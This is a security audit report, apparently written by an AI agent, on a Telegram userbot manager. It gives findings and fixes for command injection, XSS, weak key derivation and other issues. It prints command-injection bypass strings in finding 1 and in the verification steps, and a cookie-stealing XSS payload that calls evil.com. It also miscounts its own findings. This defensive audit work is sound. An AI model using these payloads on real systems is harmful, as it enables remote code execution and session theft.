# Security Audit Report: DeltaUserJS

**Date:** July 9, 2025  
**Auditor:** Claude Code Security Agent  
**Scope:** Full codebase review — input validation, auth, data exposure, injection vectors  
**Status:** ✅ Previously fixed: exec() → execFile(), SSRF protection, path traversal prevention  

---

## Executive Summary

DeltaUserJS is a **multi-tenant Telegram userbot manager** (TypeScript, grammY + GramJS). The codebase shows strong security awareness with several protections already in place (command whitelist, VM sandboxing, session encryption). However, **7 vulnerabilities** were identified across 4 severity levels, plus **3 architectural concerns**.

**Overall Risk: MEDIUM** — No critical RCE or auth bypass found, but several high-severity issues need immediate attention.

---

## Vulnerability Findings

### 🔴 HIGH SEVERITY

#### 1. Command Injection via Regex Bypass in `.exec/.sh`

**File:** `src/userbot/handlers/system/exec.ts` (line 25)  
**Issue:** The regex `/[;|&`$(){}!\\\\n\\\\r\\\\t]/` uses **double-escaped backslashes** (`\\\\n` matches literal `\n`, not newline). An attacker can bypass the filter with:

```bash
.exec echo$(whoami)
.exec echo foo;id
.exec echo $((`id`))
```

The regex also doesn't block:
- Newlines (`\n`, `\r`) — actual newline characters pass through
- Subshell syntax `$()` and backticks are only partially blocked
- Process substitution `<()` and `>()`

**Impact:** Full RCE as the bot process user, despite whitelist.

**Fix:**
```typescript
// Replace line 25 with:
if (/[;|&`$(){}!<>\n\r\t]/.test(cmd)) {
```

**Priority:** P0 — Fix immediately.

---

#### 2. HTML Injection / Stored XSS in Welcome Messages

**Files:** `src/userbot/handlers/group/welcome.ts` (lines 57-67)  
**Issue:** Welcome/goodbye templates are stored as plain text and rendered with `parseMode: 'html'` without sanitization. An admin can set:

```
.setwelcomemsg <img src=x onerror="document.location='http://evil.com/?c='+document.cookie">
<a href="javascript:alert(1)">click</a>
```

While Telegram's HTML parser is limited (no `<script>`), it supports `<a href="javascript:...">` and `<tg-spoiler>` with event handlers in some clients. More critically, **user names** (`{name}`) are injected unsanitized — a user could set their name to `</b><img src=x>` to break out of context.

**Impact:** Stored XSS against group members viewing welcome messages. Could steal session cookies if Telegram web client is targeted.

**Fix:** Sanitize template variables with `escapeHtml()` before substitution, and validate templates don't contain dangerous tags.

```typescript
import { escapeHtml } from '../../../utils/richMessage.js';

const parsedMsg = welcomeTemplate
  .replace(/{name}/g, escapeHtml(name))
  .replace(/{id}/g, escapeHtml(String(uId)))
  .replace(/{title}/g, escapeHtml(title));
```

**Priority:** P1 — Fix within sprint.

---

#### 3. Insecure Crypto Key Derivation

**File:** `src/utils/crypto.ts` (lines 15-23)  
**Issue:** The encryption key is derived using `crypto.scryptSync(ENCRYPTION_KEY || 'disabled', salt, 32)` with a **16-byte salt derived from the key itself** (not random). This means:
- Same `ENCRYPTION_KEY` → same derived key (deterministic)
- If `ENCRYPTION_KEY` is not set, defaults to `'disabled'` — all sessions encrypted with the same key
- No minimum password length enforcement

**Impact:** If `.env` is leaked without `ENCRYPTION_KEY` set, all session strings can be decrypted with the known default key `'disabled'`.

**Fix:**
```typescript
// Generate a random salt on first run and persist it
// Or require ENCRYPTION_KEY and use a proper KDF with random salt
if (!ENCRYPTION_KEY) {
  console.error('FATAL: ENCRYPTION_KEY must be set. Generate with: openssl rand -hex 32');
  process.exit(1);
}
```

**Priority:** P1 — Fix before production deployment.

---

### 🟠 MEDIUM SEVERITY

#### 4. Missing Input Validation on User Vars (`.setvar`)

**File:** `src/bot/conversations/settings.ts` (lines 172-201)  
**Issue:** Users can set arbitrary var names and values via the Vars Config conversation. While the key is sanitized to `[A-Z0-9_]`, the **value has no length limit or content validation**. A user could:
- Store megabytes of data per var (database bloat)
- Store serialized objects that could be exploited if ever deserialized unsafely
- Set `INLINE_BOT_TOKEN` to a malicious token that exfiltrates data

**Impact:** DoS via database bloat; potential token injection.

**Fix:** Add max length (e.g., 4096 chars), validate value is plain text, and restrict sensitive var names.

**Priority:** P2.

---

#### 5. No Rate Limiting on Master Bot Commands

**File:** `src/bot/index.ts` (lines 25-32)  
**Issue:** Rate limiter is configured (`limit: 3` per `2000ms`), but it only applies to the **Grammy middleware chain**. Userbot handlers (`.exec`, `.gcast`, `.stalk`, etc.) run in a **separate event loop** via `client.addEventHandler()` and bypass this limiter entirely.

A malicious userbot could:
- Spam `.gcast` to thousands of groups (account ban)
- Flood `.stalk` requests (API rate limit)
- Trigger `.exec` repeatedly (CPU exhaustion)

**Impact:** Account suspension, resource exhaustion.

**Fix:** Implement per-userbot rate limiting in the plugin execution loop (`src/userbot/engine/client.ts` line 169).

**Priority:** P2.

---

#### 6. Sensitive Data in Logs

**Files:** Multiple handlers use `console.error()` with error messages that may contain:
- Session strings (`.registration.ts`)
- API tokens (`.settings.ts`)
- User IDs and phone numbers

**Impact:** Log aggregation systems (ELK, CloudWatch) would store sensitive data.

**Fix:** Implement structured logging that redacts sensitive fields.

**Priority:** P2.

---

### 🟡 LOW SEVERITY

#### 7. Missing CSRF Protection on Callback Queries

**File:** `src/bot/handlers/callbacks.ts`  
**Issue:** Callback data like `approve_reg:${telegramId}` and `var:set:INLINE_BOT_TOKEN` are not cryptographically signed. A malicious bot in a shared group could craft inline keyboards with these callbacks to trick users into clicking.

**Impact:** Low — attacker needs user to click a crafted button. But could approve unauthorized users or change vars.

**Fix:** Sign callback data with HMAC using a bot secret.

**Priority:** P3.

---

#### 8. No Timeout on Database File Writes

**File:** `src/infrastructure/dbCore.ts`  
**Issue:** `writeDbToFile()` uses synchronous `fs.writeFileSync()` with no timeout. If the disk is slow or full, the entire bot blocks.

**Impact:** Denial of service during disk pressure.

**Fix:** Use async `fs.promises.writeFile()` with proper error handling.

**Priority:** P3.

---

#### 9. Unvalidated `custom_name` Field

**File:** `src/userbot/handlers/group/settings.ts` (line 52-54)  
**Issue:** `.setname` accepts arbitrary-length strings with no validation. Could be used to inject HTML into messages that include the custom name.

**Impact:** Low — only visible to the user themselves.

**Priority:** P3.

---

## Architectural Concerns

### A. No Defense in Depth for Plugin Execution

Plugins run with full access to the `client`, `message`, and `settings` objects. A malicious plugin (loaded from the `handlers/` directory) could:
- Access all user sessions from `dbCache`
- Send messages as any userbot
- Read environment variables

**Recommendation:** Sandbox plugin execution with a restricted context, or at minimum, audit loaded plugins on startup.

---

### B. File-Based Database is Not Production-Safe

`database.json` stored in the repo root has:
- No access controls (file permissions are `644` by default)
- No backup/replication
- Race conditions despite write locks (process crash mid-write → corruption)

**Recommendation:** Require MongoDB for production; make JSON DB dev-only.

---

### C. No Audit Logging

Critical actions (user approval, session registration, var changes, exec commands) have no audit trail. If a breach occurs, there's no way to reconstruct what happened.

**Recommendation:** Log all security-relevant events to a tamper-evident log (append-only file or dedicated audit service).

---

## Positive Security Controls (Already in Place)

✅ **Command injection whitelist** (even with regex bug, the intent is correct)  
✅ **VM sandboxing for `.eval`** — uses `vm.runInContext` with restricted globals  
✅ **Session string encryption** — AES-256-GCM with auth tag  
✅ **Rate limiting on Master Bot** — `@grammyjs/ratelimiter` middleware  
✅ **SSRF protection** — no arbitrary URL fetching from user input  
✅ **Path traversal prevention** — plugin loader uses `readdir` not user input  
✅ **Owner-only checks** — `isOwner()` used consistently  
✅ **Graceful shutdown** — SIGINT/SIGTERM handlers clean up resources  

---

## Recommended Fix Priority

| # | Vulnerability | Severity | Effort | Priority |
|---|--------------|----------|--------|----------|
| 1 | Command injection regex bypass | HIGH | 5 min | **P0** |
| 2 | HTML injection in welcome messages | HIGH | 30 min | **P1** |
| 3 | Insecure crypto key derivation | HIGH | 1 hour | **P1** |
| 4 | Missing input validation on user vars | MEDIUM | 30 min | **P2** |
| 5 | No rate limiting on userbot handlers | MEDIUM | 2 hours | **P2** |
| 6 | Sensitive data in logs | MEDIUM | 1 hour | **P2** |
| 7 | Missing CSRF protection on callbacks | LOW | 2 hours | **P3** |
| 8 | No timeout on DB file writes | LOW | 30 min | **P3** |
| 9 | Unvalidated custom_name field | LOW | 10 min | **P3** |

---

## Verification Steps

After fixes, verify with:

```bash
# 1. Test command injection bypass
.exec echo$(whoami)
.exec echo foo;id
.exec echo $((`id`))

# 2. Test XSS in welcome
.setwelcomemsg <img src=x onerror="alert(1)"> {name}

# 3. Test crypto without ENCRYPTION_KEY
# Remove ENCRYPTION_KEY from .env and verify app refuses to start

# 4. Test rate limiting on userbot
# Send 10 .gcast commands in rapid succession
```

---

**End of Report**
